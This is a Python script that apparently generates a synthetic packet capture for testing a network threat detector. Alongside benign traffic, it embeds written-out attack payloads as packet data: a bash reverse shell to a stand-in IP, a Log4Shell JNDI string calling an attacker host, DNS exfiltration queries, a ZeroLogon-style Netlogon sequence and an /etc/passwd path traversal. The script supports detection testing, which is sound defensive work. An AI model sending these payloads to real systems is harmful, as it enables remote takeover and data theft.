#!/usr/bin/env python3
"""
Synthetic PCAP Generator for BeaconHunter Testing.
Creates a realistic multi-threat traffic capture containing:
1. Normal user web browsing (randomized intervals, non-periodic).
2. Realistic C2 Beaconing (periodic intervals with ~10% jitter).
3. High-entropy DNS Tunneling / Data exfiltration.
4. Simulated ZeroLogon (CVE-2020-1472 / EDB-49301) attack against a Domain Controller (MS-NRPC).
5. Simulated Log4Shell (CVE-2021-44228 / EDB-50592) JNDI RCE attempt over HTTP.
6. Simulated Unix Reverse Shell command injection payload.
7. Simulated Path Traversal / LFI attempt (../../../../etc/passwd).
"""

import os
import random
import struct
from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR
from scapy.utils import wrpcap

# Netlogon UUID Little Endian
NETLOGON_UUID_LE = b"\x78\x56\x34\x12\x34\x12\xcd\xab\xef\x00\x01\x23\x45\x67\xcf\xfb"


def create_dcerpc_request(opnum: int, payload_data: bytes) -> bytes:
    frag_len = 24 + len(payload_data)
    header = b"\x05\x00\x00\x03\x10\x00\x00\x00"
    header += struct.pack("<H", frag_len)
    header += b"\x00\x00"
    header += b"\x01\x00\x00\x00"
    header += struct.pack("<I", len(payload_data))
    header += b"\x00\x00"
    header += struct.pack("<H", opnum)
    return header + payload_data


def create_dcerpc_response(status_code: int = 0x00000000) -> bytes:
    payload_data = struct.pack("<I", status_code)
    frag_len = 24 + len(payload_data)
    header = b"\x05\x00\x02\x03\x10\x00\x00\x00"
    header += struct.pack("<H", frag_len)
    header += b"\x00\x00"
    header += b"\x01\x00\x00\x00"
    header += struct.pack("<I", len(payload_data))
    header += b"\x00\x00"
    header += b"\x00\x00"
    return header + payload_data


def generate_synthetic_pcap(output_path: str = "samples/c2_traffic_sample.pcap"):
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    packets = []
    
    base_time = 1700000000.0
    client_ip = "192.168.1.105"

    print("[*] Generating comprehensive multi-threat network capture...")

    # -------------------------------------------------------------
    # 1. Normal Web Traffic (Bursty, non-periodic)
    # -------------------------------------------------------------
    benign_servers = ["142.250.190.46", "140.82.121.3", "151.101.1.140"]
    cur_time = base_time

    for _ in range(15):
        cur_time += random.uniform(5.0, 65.0)
        target = random.choice(benign_servers)

        sport = random.randint(49152, 65535)
        p1 = IP(src=client_ip, dst=target) / TCP(sport=sport, dport=443, flags="S")
        p1.time = cur_time

        p2 = IP(src=target, dst=client_ip) / TCP(sport=443, dport=sport, flags="SA")
        p2.time = cur_time + 0.02

        p3 = IP(src=client_ip, dst=target) / TCP(sport=sport, dport=443, flags="A")
        p3.time = cur_time + 0.03

        packets.extend([p1, p2, p3])

    # -------------------------------------------------------------
    # 2. C2 Beaconing Traffic (Cobalt Strike / Sliver style)
    # -------------------------------------------------------------
    c2_ip = "198.51.100.44"
    c2_port = 8443
    beacon_interval = 30.0
    jitter_range = 3.0
    cur_time = base_time + 10.0

    print("[*] Injecting simulated C2 beaconing (30s interval, 10% jitter)...")

    for _ in range(10):
        interval = beacon_interval + random.uniform(-jitter_range, jitter_range)
        cur_time += interval

        sport = random.randint(50000, 60000)
        syn = IP(src=client_ip, dst=c2_ip) / TCP(sport=sport, dport=c2_port, flags="S")
        syn.time = cur_time

        syn_ack = IP(src=c2_ip, dst=client_ip) / TCP(sport=c2_port, dport=sport, flags="SA")
        syn_ack.time = cur_time + 0.015

        ack = IP(src=client_ip, dst=c2_ip) / TCP(sport=sport, dport=c2_port, flags="A")
        ack.time = cur_time + 0.02

        payload = IP(src=client_ip, dst=c2_ip) / TCP(sport=sport, dport=c2_port, flags="PA") / b"POST /api/v1/heartbeat HTTP/1.1\r\nHost: c2.internal\r\n\r\n"
        payload.time = cur_time + 0.03

        packets.extend([syn, syn_ack, ack, payload])

    # -------------------------------------------------------------
    # 3. DNS Traffic (Legitimate + High Entropy Exfil)
    # -------------------------------------------------------------
    dns_server = "192.168.1.1"

    legit_domains = ["google.com", "github.com", "microsoft.com", "weather.com"]
    for d in legit_domains:
        t = base_time + random.uniform(1.0, 300.0)
        dns_pkt = IP(src=client_ip, dst=dns_server) / UDP(sport=random.randint(50000, 60000), dport=53) / DNS(rd=1, qd=DNSQR(qname=d))
        dns_pkt.time = t
        packets.append(dns_pkt)

    print("[*] Injecting simulated high-entropy DNS exfiltration queries...")
    exfil_subdomains = [
        "a9f4c3b2e1d7045a89bc21.exfil.threat-actor.org",
        "7b8c9d0e1f2a3b4c5d6e7f.exfil.threat-actor.org",
        "deadbeef0123456789abcdef.exfil.threat-actor.org",
    ]

    for sub in exfil_subdomains:
        t = base_time + random.uniform(20.0, 250.0)
        exfil_pkt = IP(src=client_ip, dst=dns_server) / UDP(sport=random.randint(50000, 60000), dport=53) / DNS(rd=1, qd=DNSQR(qname=sub))
        exfil_pkt.time = t
        packets.append(exfil_pkt)

    # -------------------------------------------------------------
    # 4. ZeroLogon (CVE-2020-1472 / EDB-49301) Attack Simulation
    # -------------------------------------------------------------
    attacker_ip = "192.168.1.55"
    dc_ip = "192.168.1.10"
    dc_port = 445
    zl_time = base_time + 45.0

    print("[*] Injecting CVE-2020-1472 ZeroLogon exploit stream...")

    bind_pdu = b"\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00" + NETLOGON_UUID_LE + b"\x01\x00\x00\x00"
    p_bind = IP(src=attacker_ip, dst=dc_ip) / TCP(sport=51234, dport=dc_port, flags="PA") / bind_pdu
    p_bind.time = zl_time
    packets.append(p_bind)
    zl_time += 0.05

    req_challenge = create_dcerpc_request(4, b"\\DC01\x00\x00" + (b"\x00" * 8))
    p_req = IP(src=attacker_ip, dst=dc_ip) / TCP(sport=51234, dport=dc_port, flags="PA") / req_challenge
    p_req.time = zl_time
    packets.append(p_req)
    zl_time += 0.05

    for attempt in range(40):
        zl_time += 0.01
        auth_pdu = create_dcerpc_request(26, b"\x00" * 32)
        p_auth = IP(src=attacker_ip, dst=dc_ip) / TCP(sport=51234, dport=dc_port, flags="PA") / auth_pdu
        p_auth.time = zl_time
        packets.append(p_auth)

        if attempt == 30:
            zl_time += 0.005
            resp_pdu = create_dcerpc_response(0x00000000)
            p_resp = IP(src=dc_ip, dst=attacker_ip) / TCP(sport=dc_port, dport=51234, flags="PA") / resp_pdu
            p_resp.time = zl_time
            packets.append(p_resp)

    zl_time += 0.05
    pw_reset_pdu = create_dcerpc_request(30, b"\x00" * 64)
    p_pw = IP(src=attacker_ip, dst=dc_ip) / TCP(sport=51234, dport=dc_port, flags="PA") / pw_reset_pdu
    p_pw.time = zl_time
    packets.append(p_pw)

    # -------------------------------------------------------------
    # 5. Log4Shell (CVE-2021-44228 / EDB-50592) JNDI Injection
    # -------------------------------------------------------------
    print("[*] Injecting Log4Shell (CVE-2021-44228) JNDI RCE packet...")
    web_server = "192.168.1.80"
    log4j_time = base_time + 120.0
    log4j_payload = (
        b"GET /login HTTP/1.1\r\n"
        b"Host: 192.168.1.80:8080\r\n"
        b"User-Agent: ${jndi:ldap://attacker-c2.net:1389/Exploit}\r\n"
        b"Accept: text/html\r\n\r\n"
    )
    p_log4j = IP(src=attacker_ip, dst=web_server) / TCP(sport=43210, dport=8080, flags="PA") / log4j_payload
    p_log4j.time = log4j_time
    packets.append(p_log4j)

    # -------------------------------------------------------------
    # 6. Unix Reverse Shell & Path Traversal Injection
    # -------------------------------------------------------------
    print("[*] Injecting Unix Reverse Shell and Path Traversal packets...")
    shell_time = base_time + 180.0
    shell_payload = b"POST /api/cmd HTTP/1.1\r\nHost: 192.168.1.80\r\n\r\ncmd=/bin/bash -i >& /dev/tcp/198.51.100.44/4444 0>&1\r\n"
    p_shell = IP(src=attacker_ip, dst=web_server) / TCP(sport=43212, dport=8080, flags="PA") / shell_payload
    p_shell.time = shell_time
    packets.append(p_shell)

    trav_time = base_time + 210.0
    trav_payload = b"GET /view?page=../../../../etc/passwd HTTP/1.1\r\nHost: 192.168.1.80\r\n\r\n"
    p_trav = IP(src=attacker_ip, dst=web_server) / TCP(sport=43214, dport=8080, flags="PA") / trav_payload
    p_trav.time = trav_time
    packets.append(p_trav)

    # Sort all packets strictly by timestamp
    packets.sort(key=lambda p: float(p.time))

    wrpcap(output_path, packets)
    print(f"[✔] Successfully generated complete multi-threat PCAP with {len(packets)} packets at: {output_path}")


if __name__ == "__main__":
    generate_synthetic_pcap()
